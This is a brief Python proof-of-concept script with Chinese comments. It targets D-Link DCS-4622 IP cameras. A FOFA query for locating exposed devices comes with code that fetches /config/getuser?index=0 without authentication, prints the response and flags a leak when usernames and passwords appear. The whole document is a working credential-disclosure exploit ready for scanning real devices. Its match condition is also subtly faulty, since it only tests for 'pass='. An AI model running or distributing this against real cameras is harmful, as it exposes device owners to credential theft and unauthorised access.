# fofa：app="D_Link-DCS-4622"
# link：/config/getuser?index=0

#脚本
import requests,urllib3,warnings
# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = ""        #可能存在漏洞的url
link = "/config/getuser?index=0"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
}

res1 = requests.get(url=url,headers=headers,timeout=5,verify=False)
print(res1.status_code)
if res1.status_code == 401:
    res2 = requests.get(url=url+link,headers=headers,timeout=5,verify=False)
    print(res2.text)
    if "name=" and "pass=" in res2.text:
        print(f"[+]该{url}存在信息泄露")
    else:
        print(f"[-]该{url}不存在信息泄露")
